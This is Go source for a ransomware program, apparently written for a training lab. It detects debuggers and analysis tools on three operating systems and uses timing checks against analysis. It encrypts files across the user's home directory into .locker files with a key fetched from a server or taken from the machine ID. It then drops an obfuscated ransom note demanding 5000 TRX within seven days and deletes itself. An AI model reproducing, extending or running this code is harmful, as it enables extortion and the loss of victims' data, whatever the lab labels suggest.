package main

import (
	"crypto/sha256"
	"fmt"
	"os"
	"os/exec"
	"runtime"
	"sort"
	"strings"
	"time"
)

func getObfuscationKey() []byte {
	h := sha256.New()
	h.Write([]byte(runtime.GOOS))
	h.Write([]byte(runtime.GOARCH))
	return h.Sum(nil)[:16]
}

func xorString(input string, key []byte) string {
	output := make([]byte, len(input))
	for i := 0; i < len(input); i++ {
		output[i] = input[i] ^ key[i%len(key)]
	}
	return string(output)
}

func buildReadmeContent(successCount, failCount int, machineID string) string {
	parts := []string{
		"\n╔═══════════════════════════════════════════════════════════════╗\n",
		"║                    🔐 YOUR FILES ARE LOCKED 🔐                ║\n",
		"╚═══════════════════════════════════════════════════════════════╝\n\n",
		"All your files have been encrypted!\n\n",
		"📊 ENCRYPTION SUMMARY:\n",
		fmt.Sprintf("   • Files encrypted: %d\n", successCount),
		fmt.Sprintf("   • Files failed: %d\n\n", failCount),
		"🔑 YOUR MACHINE ID:\n",
		fmt.Sprintf("   %s\n\n", machineID),
		"📝 INSTRUCTIONS TO UNLOCK YOUR FILES:\n",
		"   1. Visit: http://ransomware.lab/\n",
		"   2. Login with your Machine ID\n",
		"   3. Update your wallet address (Tron Nile Testnet)\n",
		"   4. Deposit minimum 5000 TRX to your wallet\n",
		"   5. Download the decrypt tool\n",
		"   6. Run the decrypt tool to restore your files\n\n",
		"⚠️  WARNING:\n",
		"   • Keep this machine id safe! You will need it to decrypt your files\n",
		"   • You have 7 days to complete the payment\n",
		"   • After 7 days, you will lose access to the decrypt tool\n",
		"   • DO NOT delete .locker files or you will lose your data forever!\n\n",
		"⏰ Time is ticking... Act fast!\n\n",
		"═══════════════════════════════════════════════════════════════\n",
	}

	var builder strings.Builder
	for _, part := range parts {
		builder.WriteString(part)
	}

	content := builder.String()

	for i := range parts {
		parts[i] = ""
	}

	return content
}

func obfuscatePassword(password string) []byte {
	key := getObfuscationKey()
	obfuscated := make([]byte, len(password))
	for i := 0; i < len(password); i++ {
		obfuscated[i] = password[i] ^ key[i%len(key)]
	}
	return obfuscated
}

func deobfuscatePassword(obfuscated []byte) string {
	key := getObfuscationKey()
	password := make([]byte, len(obfuscated))
	for i := 0; i < len(obfuscated); i++ {
		password[i] = obfuscated[i] ^ key[i%len(key)]
	}
	return string(password)
}

func checkDebuggerWindows() bool {
	cmd := exec.Command("tasklist")
	output, err := cmd.Output()
	if err == nil {
		outputStr := strings.ToLower(string(output))
		debuggers := []string{
			"ollydbg", "x64dbg", "x32dbg", "windbg", "ida", "ida64",
			"idaq", "idaq64", "idaw", "idaw64", "scylla", "protection_id",
			"peid", "lordpe", "importrec", "immunitydebugger", "processhacker",
			"cheatengine", "pestudio", "hiew", "debugview",
		}
		for _, dbg := range debuggers {
			if strings.Contains(outputStr, dbg) {
				return true
			}
		}
	}

	cmd = exec.Command("wmic", "process", "where", fmt.Sprintf("ProcessId=%d", os.Getppid()), "get", "Name")
	output, err = cmd.Output()
	if err == nil {
		parent := strings.ToLower(string(output))
		debuggers := []string{"ollydbg", "x64dbg", "x32dbg", "windbg", "ida"}
		for _, dbg := range debuggers {
			if strings.Contains(parent, dbg) {
				return true
			}
		}
	}

	return false
}

func checkDebuggerMacOS() bool {
	cmd := exec.Command("ps", "aux")
	output, err := cmd.Output()
	if err == nil {
		outputStr := strings.ToLower(string(output))
		debuggers := []string{"lldb", "gdb", "dtrace", "dtruss", "instruments", "sample"}
		for _, dbg := range debuggers {
			if strings.Contains(outputStr, dbg) {
				return true
			}
		}
	}

	ppid := os.Getppid()
	cmd = exec.Command("ps", "-p", fmt.Sprintf("%d", ppid), "-o", "comm=")
	output, err = cmd.Output()
	if err == nil {
		parent := strings.ToLower(strings.TrimSpace(string(output)))
		debuggers := []string{"lldb", "gdb", "dtrace", "dtruss"}
		for _, dbg := range debuggers {
			if strings.Contains(parent, dbg) {
				return true
			}
		}
	}

	return false
}

func checkDebuggerLinux() bool {
	data, err := os.ReadFile("/proc/self/status")
	if err == nil {
		lines := strings.Split(string(data), "\n")
		for _, line := range lines {
			if strings.HasPrefix(line, "TracerPid:") {
				parts := strings.Fields(line)
				if len(parts) >= 2 && parts[1] != "0" {
					return true
				}
			}
		}
	}

	ppid := os.Getppid()
	cmd := exec.Command("ps", "-p", fmt.Sprintf("%d", ppid), "-o", "comm=")
	output, err := cmd.Output()
	if err == nil {
		parent := strings.ToLower(strings.TrimSpace(string(output)))
		debuggers := []string{"gdb", "lldb", "strace", "ltrace", "dlv", "delve", "radare2", "r2"}
		for _, dbg := range debuggers {
			if strings.Contains(parent, dbg) {
				return true
			}
		}
	}

	return false
}

func checkDebugger() bool {
	switch runtime.GOOS {
	case "linux":
		if checkDebuggerLinux() {
			return true
		}
	case "windows":
		if checkDebuggerWindows() {
			return true
		}
	case "darwin":
		if checkDebuggerMacOS() {
			return true
		}
	}

	suspiciousEnvs := []string{
		"LD_PRELOAD",
		"DYLD_INSERT_LIBRARIES",
		"DYLD_LIBRARY_PATH",
		"_NT_SYMBOL_PATH",
		"_NT_ALT_SYMBOL_PATH",
	}
	for _, env := range suspiciousEnvs {
		if os.Getenv(env) != "" {
			return true
		}
	}

	return false
}

func antiDebugTiming() bool {
	checks := []struct {
		duration  time.Duration
		threshold time.Duration
	}{
		{50 * time.Millisecond, 100 * time.Millisecond},
		{100 * time.Millisecond, 200 * time.Millisecond},
		{25 * time.Millisecond, 50 * time.Millisecond},
	}

	for _, check := range checks {
		start := time.Now()
		time.Sleep(check.duration)
		elapsed := time.Since(start)

		if elapsed > check.threshold {
			return true
		}
	}

	start := time.Now()
	dummy := 0
	for i := 0; i < 1000; i++ {
		dummy += i
	}
	elapsed := time.Since(start)

	if elapsed > 10*time.Millisecond {
		return true
	}

	_ = dummy

	return false
}

func main() {
	if checkDebugger() {
		os.Exit(1)
	}

	if antiDebugTiming() {
		os.Exit(1)
	}

	home := getHomeDir()
	if home == "" {
		os.Exit(1)
	}

	var files []string
	scan(home, 0, 10, &files)
	// scan("/workspaces/csaf/data/locker/Desktop", 0, 10, &files)
	sort.Strings(files)

	password, err := getPasswordFromServer()
	if err != nil {
		password, err = getMachineID()
		if err != nil {
			os.Exit(1)
		}
		fmt.Fprintln(os.Stderr, "Using fallback method (raw machine ID)")
	} else {
		fmt.Fprintln(os.Stderr, "Using primary method (generated password)")
	}

	obfuscatedPwd := obfuscatePassword(password)
	clearString(&password)

	aesKey := deriveAESKey(deobfuscatePassword(obfuscatedPwd))
	defer clearAESKey(&aesKey)

	successCount := 0
	failCount := 0

	for _, filePath := range files {
		if strings.HasSuffix(filePath, ".locker") {
			fmt.Printf("[SKIP] %s (already encrypted)\n", filePath)
			continue
		}

		if strings.HasSuffix(filePath, "README.txt") || strings.HasSuffix(filePath, "readme.txt") {
			fmt.Printf("[SKIP] %s (ransom note)\n", filePath)
			continue
		}

		baseName := filePath[strings.LastIndex(filePath, "/")+1:]
		if baseName == "encrypt" || baseName == "decrypt" || baseName == "encrypt.exe" || baseName == "decrypt.exe" {
			fmt.Printf("[SKIP] %s (system file)\n", filePath)
			continue
		}

		encrypted, err := encryptFile(filePath, aesKey)
		if err != nil {
			fmt.Fprintf(os.Stderr, "Error encrypting file: %v\n", err)
			continue
		}

		if err := writeEncryptedFile(filePath, encrypted); err != nil {
			fmt.Fprintf(os.Stderr, "Error writing file: %v\n", err)
			failCount++
			continue
		}

		originalPath := filePath[:len(filePath)-7]
		fmt.Printf("[OK] %s -> %s.locker\n", filePath, originalPath)
		successCount++
	}

	fmt.Printf("\nEncryption completed: %d successful, %d failed\n", successCount, failCount)

	if successCount > 0 {
		machineID := deobfuscatePassword(obfuscatedPwd)
		readmeContent := buildReadmeContent(successCount, failCount, machineID)

		clearString(&machineID)

		readmePath := string([]byte{82, 69, 65, 68, 77, 69, 46, 116, 120, 116})
		if err := os.WriteFile(readmePath, []byte(readmeContent), 0644); err != nil {
			fmt.Fprintf(os.Stderr, "Error creating README.txt: %v\n", err)
		}

		clearString(&readmeContent)
	}

	for i := range obfuscatedPwd {
		obfuscatedPwd[i] = 0
	}

	execPath, err := os.Executable()
	if err != nil {
		fmt.Fprintf(os.Stderr, "Warning: Cannot determine executable path: %v\n", err)
	} else {
		if err := os.Remove(execPath); err != nil {
			fmt.Fprintf(os.Stderr, "Warning: Failed to self-delete: %v\n", err)
		}
	}
}
